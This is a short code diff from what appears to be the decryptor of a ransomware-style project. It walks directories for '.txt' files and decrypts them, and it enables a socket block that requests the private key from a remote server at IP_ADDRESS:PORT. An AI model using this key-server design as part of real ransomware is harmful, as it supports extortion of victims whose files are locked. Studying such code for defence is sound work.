@@ -19,7 +19,6 @@ def get_files(encrypted_extensions):
                 file_paths.append(root+'\\'+file)
     return file_paths
 
-
 def decrypt(dataFile, private_key_file):
     with open(private_key_file, 'rb') as file:
         private_key = file.read()
@@ -39,14 +38,13 @@ def decrypt(dataFile, private_key_file):
     
     print('Done Decpyting: ' + dataFile)
 
-'''
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
     s.connect((IP_ADDRESS, PORT))
-    private_key = s.recv(1024)
+    s.send('private_key required!'.encode())
+    private_key = s.recv(2048)
     with open('private_key.pem', 'wb') as f:
         f.write(private_key)
     s.close()
-'''
 
 encrypted_extensions = ('.txt',) # all the extensions that will be decrypted
 
